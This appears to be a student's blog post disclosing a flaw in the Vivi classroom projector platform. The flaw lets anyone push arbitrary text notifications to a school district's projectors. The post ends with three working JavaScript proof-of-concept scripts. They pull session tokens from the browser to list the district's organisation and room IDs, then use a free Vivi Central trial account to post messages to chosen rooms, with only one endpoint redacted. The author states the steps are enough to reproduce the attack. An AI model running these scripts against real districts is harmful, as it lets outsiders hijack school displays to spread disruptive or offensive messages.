+++
title = 'Arbitrarily Send Notifications to Any Vivi Projector'
date = 2025-05-31T00:50:52Z
draft = false
+++

While this vulnerability is more funny than immediately dangerous, the potential abuse factor is still considerable, which is why I am posting this. With this, someone could disrupt something or send inappropriate messages across a district, compromising the system, based on how much weight the messages carry (this varies school to school; in my school, nobody really cares).

![message on my school projector](../../vivi-message.png)

Although it's a bit hard to see on the image, I was able to write a bunch of nonsense to the central projectors in my school, through a vulnerability in the notification feature, and anyone in the school could see. Vivi is a wireless presentation and collaboration platform that enables users to share content, interact with presentations, and manage projectors without the need for physical connections. It's like software for a Promethean ActivPanel, except Vivi centralizes projector management a lot more, kind of like Google Admin Console. Vivi exposes two important things: first is app.vivi.io, which uses your IP to determine what district you might be trying to log into. Once logged into app.vivi.io, you essentially have no permissions by default. You can get configured rooms in your district, and do stuff like send a request for futher access, but that's about it. The second is a lot more interesting: admin.vivi.io, AKA Vivi Central. This is the centralization piece: administrators can control the district's network of projectors using Vivi through Vivi Central.

Theoretically, instead of silly scripts, notifications could contain offensive or disruptive content, and be pushed to the entire district through chaining data that Vivi gives, but I would personally say that it's pretty unlikely. This post also includes the failures I saw; it was suprised how locked-down the system was. Yes, although I did find some more "vulnerabilities" in the system and what it returned, most of it wasn't useful to chain into a larger vulnerability, and they weren't very important by themselves. I still feel like there's more vulns that exist in Vivi, though.

## TL;DR:

With a target district ID and room IDs for projectors, you can push a text notification to the device. This can be anything, and it can go for a time that you specify. There is only one requirement: you need to be authenticated to the district on Vivi, and in my case, it was possible through SSO (which also automatically signed me up), so you can get room IDs. PoC scripts are attached, and it was made to do this automatically.

Then, to get access to Vivi Central (where you can then run the actual notification-pusher script), sign up at the [IT Admins Trial](https://www.vivi.io/trial/) page; you can create a free, credit-cardless account that works for Vivi Central. Then, with the data gathered through the two prior PoC scripts, you can use the last PoC on https://admin.vivi.io to create the notifications event.

## How it started

In our school, there is a projector in the main commons room that creates a massive projection; for a while, I've wanted to do something to it, but I had never had the opportunity. It was too far up to do anything with the projector's sensors, even when I was directly under it. I couldn't get its IP or Mac Address, and it was actually pretty secure. In fact, I was pretty confused about how they turned the projector off at the end of the day; after this vulnerability, I assume they do it through Vivi Central.

Near the end of the school year, I saw something that immediately grabbed my attention: it was a splash page, and although at first glance, it might not have looked very important, it leaked the software's name which manages the projector. After I saw the instructions on the splash screen and an access code, I immediately tried to start casting my screen to the projectors.

## Plan A

I went to https://app.vivi.io, which asked me for a Vivi account. When I pressed sign in, it created an SSO popup, and I used my account, which actually worked. This suprised me, as I did not expect it to automatically create a student account for me. I saw a list of rooms on my district, and I chose my central projector, which was labeled in a way that I could easily identify it.

However, when I saw the dashboard, I was somewhat disappointed. As expected, I could do nothing important. It was totally useless, but I didn't completely give up. I opened dev tools and started reconning the app, to see if it was a simple bypass. It wasn't, as there were server side checks on most of my actions, but then I saw something that I did not expect to see:

![ip.png](../../ip.png)

## Plan B

It completely leaked the INTERNAL IP and Mac Address of the projector! This was information I was looking for, and now, it leaks it, AND updates the internal IP when it changes. Of course, I couldn't do anything important off the bat with this IP (other than try stuff like a deauth attack, which would have been useless, anyways), but it motivated me to keep digging for an actual vulnerability. My goal was to put my own content arbitrarily on the projector, and I envisioned something like pushing my own image (I was unable to do this, as this was locked down by Vivi Central).

I kept pentesting app.vivi.io, and although I found some cool stuff, like the internal menu used by Vivi Staff, much of it was unimportant.

I found Vivi Central a little bit later, but I wasn't able to log into Vivi Central using my school account like how I was able to log into app.vivi.io. However, a little bit of searching later, I found that they issued on-demand access through free trials that didn't even ask for a credit card. Through this, I was able to access the web panel. From there, after a little tinkering around, I was able to use their request to post a notification to any Vivi device (I know I skipped a lot here, but I did so because I've procrastinated writing this public disclosure for a while; I may complete it later)

## Reporting

The funny thing is that I couldn't find a support email for general inquiries at all, and instead, I had to use their super-restricted general contact form. I used it to tell them about the vulnerability and to email me back so I can report it through email. As I expected, after two buisness days, I got zero replies. I avoid custom forms from companies for this reason: the support team is used to redirecting people to other sectors, and I always have client side reciepts to prove that I did report the issue. However, with Vivi's form, I can't prove that I sent anything, or that they got it at all.

Due to the lack of response to the issue and Vivi's lack of a responsible disclosure process, I'll just release this disclosure early. Please note that the attached PoCs have been redacted a little bit (just the API urls), so I'm not literally releasing zero-days, but the information stated here is enough to reproduce. 

## PoC:

In https://app.vivi.io, while authenticated into the target's district, run this script to grab the organization ID:

```js
fetch("https://api.vivi.io/api/v1/users/identity", {
  "headers": {
    "x-user-email": JSON.parse(localStorage["vivi:session"]).authenticated.user.email,
    "x-user-token": JSON.parse(localStorage["vivi:session"]).authenticated.user.auth_token
  },
  "method": "GET",
  "mode": "cors",
  "credentials": "omit"
})
.then(data => data.json())
.then(data => alert(data.organisation_id))
```

Then, run this script to grab a list of rooms in your district (you must do this in https://app.vivi.io/):

```js
fetch("https://api.vivi.ii/api/v1/rooms?per_page=10000", {
  "headers": {
    "x-user-email": JSON.parse(localStorage["vivi:session"]).authenticated.user.email,
    "x-user-token": JSON.parse(localStorage["vivi:session"]).authenticated.user.auth_token
  },
  "method": "GET",
  "mode": "cors",
  "credentials": "omit"
})
.then(data => data.json())
.then(data => {
    data = data.rooms
    const rooms = data.map(room => ({
        name: room.name,
        room_ids: room.room_ids[0]
    }));
    console.log(rooms);
})
```

Once the target org ID and room ID has been identified, while authenticated in https://admin.vivi.io/ (make sure to sign up for a free trial, to access Vivi Central), run this script to create the notification:

```js
const orgId = prompt("Enter the Organization ID:");
const roomIds = prompt("Enter Room IDs (comma separated):").split(',');
const message = prompt("Enter the message:");
const duration = prompt("Enter the duration (in seconds):");

const authToken = localStorage.getItem("authToken");

if (!authToken) {
    alert("No authorization token found in localStorage.");
} else {
    const payload = {
        destinations: {
            room_group_ids: [],
            room_ids: roomIds
        },
        duration: parseInt(duration, 10),
        message: message,
        organisation_id: orgId
    };

    fetch("https://api.vivi.io/[redacted]", {
        method: "POST",
        headers: {
            "accept": "application/vnd.api+json",
            "authorization": `Bearer ${authToken}`,
            "content-type": "application/vnd.api+json",
        },
        body: JSON.stringify(payload),
        mode: "cors",
        credentials: "omit"
    })
    .then(response => response.json())
    .then(data => {
        console.log("Notification created successfully:", data);
        if (data.errors) {
            
        } else {
            alert("Notification sent successfully. ID: " + data.notification_id);
        }
    })
    .catch(error => {
        console.error("Error sending notification:", error);
        alert("Error sending notification.");
    });
}
```

You can target multiple rooms by splitting Room IDs using commas.